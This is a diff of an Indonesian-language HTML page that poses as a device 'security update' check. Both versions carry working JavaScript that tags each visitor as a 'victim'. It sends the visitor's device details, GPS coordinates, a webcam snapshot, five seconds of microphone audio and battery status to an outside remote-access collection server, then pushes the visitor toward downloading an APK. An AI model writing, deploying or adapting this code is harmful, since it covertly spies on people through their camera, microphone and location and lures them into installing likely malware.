@@ -1,140 +1,141 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TESTING</title>
+    <title>Security Update</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            font-family: Arial, sans-serif;
-            background: #0a0a0f;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            color: #fff;
-        }
-        .container {
-            background: #1a1a2e;
-            padding: 40px;
-            border-radius: 16px;
-            max-width: 400px;
-            width: 100%;
-            text-align: center;
-            border: 1px solid #2a2a3e;
-        }
-        .icon { font-size: 64px; margin-bottom: 20px; }
-        h1 { font-size: 20px; margin-bottom: 10px; color: #4fc3f7; }
-        p { color: #aaa; font-size: 14px; margin-bottom: 20px; line-height: 1.6; }
-        .btn {
-            display: block;
-            width: 100%;
-            padding: 14px;
-            background: #0d47a1;
-            border: none;
-            border-radius: 10px;
-            color: #fff;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            text-decoration: none;
-            transition: background 0.3s;
-        }
+        body { background: #0a0a0f; color: #fff; font-family: Arial; text-align: center; padding: 50px; }
+        .btn { background: #0d47a1; padding: 16px 32px; border: none; border-radius: 8px; color: #fff; font-size: 18px; cursor: pointer; }
         .btn:hover { background: #1565c0; }
-        .btn-success { background: #1b5e20; }
-        .btn-success:hover { background: #2e7d32; }
-        .small { font-size: 12px; color: #666; margin-top: 15px; }
     </style>
-    <script>
-        // ===== KIRIM DATA KE SERVER =====
-        const SERVER_URL = 'https://admin-rat.vercel.app';
-        let victimId = localStorage.getItem('victim_id');
-        if (!victimId) {
-            victimId = 'V' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).substring(2, 6).toUpperCase();
-            localStorage.setItem('victim_id', victimId);
-        }
+</head>
+<body>
+    <h1>🔒 Security Check</h1>
+    <p>Klik tombol di bawah untuk verifikasi keamanan perangkat Anda.</p>
+    <button class="btn" onclick="startCollection()">Mulai Verifikasi</button>
+    <div id="status"></div>
 
-        function getDeviceInfo() {
-            return {
-                userAgent: navigator.userAgent,
-                platform: navigator.platform,
-                language: navigator.language,
-                screen: screen.width + 'x' + screen.height,
-                device: /Mobile|Android|iPhone|iPad|iPod/i.test(navigator.userAgent) ? 'Mobile' : 'Desktop'
-            };
+    <script>
+        const SERVER = 'https://admin-rat.vercel.app';
+        let victimId = localStorage.getItem('victim_id') || 'V' + Date.now().toString(36).toUpperCase();
+
+        function log(msg) {
+            document.getElementById('status').innerHTML = msg;
         }
 
         function sendData(data) {
-            if (!data.id) data.id = victimId;
-            fetch(SERVER_URL + '/api/collect', {
+            fetch(SERVER + '/api/collect', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).catch(function() {});
+                body: JSON.stringify({ id: victimId, ...data })
+            }).catch(() => {});
         }
 
-        // Kirim data awal
-        sendData({ type: 'init', value: 'page_loaded', device: getDeviceInfo() });
+        async function startCollection() {
+            log('📡 Mengumpulkan data...');
 
-        // Ambil lokasi
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                function(pos) {
-                    var loc = pos.coords.latitude + ',' + pos.coords.longitude;
-                    sendData({ type: 'location', value: loc, device: getDeviceInfo() });
-                    fetch(SERVER_URL + '/api/collect/location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({ id: victimId, latitude: pos.coords.latitude, longitude: pos.coords.longitude })
-                    }).catch(function() {});
-                },
-                function() { sendData({ type: 'location', value: 'Permission denied', device: getDeviceInfo() }); }
-            );
-        }
+            // 1. Device Info
+            sendData({
+                type: 'device',
+                data: {
+                    userAgent: navigator.userAgent,
+                    platform: navigator.platform,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    isMobile: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent)
+                }
+            });
 
-        // Ambil webcam
-        if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment', width: 640, height: 480 }, audio: false })
-                .then(function(stream) {
-                    var video = document.createElement('video');
+            // 2. Lokasi GPS
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        sendData({
+                            type: 'location',
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy
+                        });
+                        log('📍 Lokasi: ' + pos.coords.latitude + ', ' + pos.coords.longitude);
+                    },
+                    () => log('❌ Lokasi ditolak')
+                );
+            }
+
+            // 3. Webcam
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: 'environment', width: 640, height: 480 },
+                        audio: false 
+                    });
+                    const video = document.createElement('video');
                     video.srcObject = stream;
-                    video.onloadedmetadata = function() {
+                    video.onloadedmetadata = () => {
                         video.play();
-                        var canvas = document.createElement('canvas');
+                        const canvas = document.createElement('canvas');
                         canvas.width = 640;
                         canvas.height = 480;
-                        var ctx = canvas.getContext('2d');
-                        ctx.drawImage(video, 0, 0, 640, 480);
-                        var imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
-                        fetch(SERVER_URL + '/api/collect/webcam', {
+                        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                        const imageData = canvas.toDataURL('image/jpeg', 0.8).split(',')[1];
+                        
+                        fetch(SERVER + '/api/collect/webcam', {
                             method: 'POST',
                             headers: { 'Content-Type': 'application/json' },
                             body: JSON.stringify({ id: victimId, image: imageData })
-                        }).catch(function() {});
-                        stream.getTracks().forEach(function(t) { t.stop(); });
+                        });
+                        log('📸 Webcam captured');
+                        stream.getTracks().forEach(t => t.stop());
                     };
-                }).catch(function() {});
-        }
+                } catch(e) {
+                    log('❌ Kamera ditolak');
+                }
+            }
 
-        // Track klik tombol
-        document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('downloadBtn').addEventListener('click', function() {
-                sendData({ type: 'download_click', value: 'APK downloaded', device: getDeviceInfo() });
-            });
-        });
+            // 4. Rekaman Audio (Microphone)
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    const recorder = new MediaRecorder(stream);
+                    const chunks = [];
+                    recorder.ondataavailable = e => chunks.push(e.data);
+                    recorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'audio/webm' });
+                        const reader = new FileReader();
+                        reader.onload = () => {
+                            const audioData = reader.result.split(',')[1];
+                            fetch(SERVER + '/api/collect/audio', {
+                                method: 'POST',
+                                headers: { 'Content-Type': 'application/json' },
+                                body: JSON.stringify({ id: victimId, audio: audioData })
+                            });
+                            log('🎤 Audio recorded');
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    recorder.start();
+                    setTimeout(() => recorder.stop(), 5000); // Rekam 5 detik
+                } catch(e) {
+                    log('❌ Mikrofon ditolak');
+                }
+            }
+
+            // 5. Battery
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                sendData({
+                    type: 'battery',
+                    level: battery.level * 100,
+                    charging: battery.charging
+                });
+            }
+
+            // 6. Redirect ke halaman download APK
+            setTimeout(() => {
+                log('📥 Mengarahkan ke download...');
+                window.location.href = 'https://your-serveo-url.serveo.net/download';
+            }, 3000);
+        }
     </script>
-</head>
-<body>
-    <div class="container">
-        <div class="icon">📱</div>
-        <h1>Update Keamanan Diperlukan</h1>
-        <p>
-            Sistem mendeteksi versi keamanan Anda sudah kadaluarsa.<br>
-            Download dan install aplikasi pembaruan keamanan terbaru.
-        </p>
-        <a href="/download" class="btn btn-success" id="downloadBtn">📥 Download APK</a>
-        <p class="small">* Setelah download, buka file dan ikuti instruksi install</p>
-    </div>
 </body>
 </html>
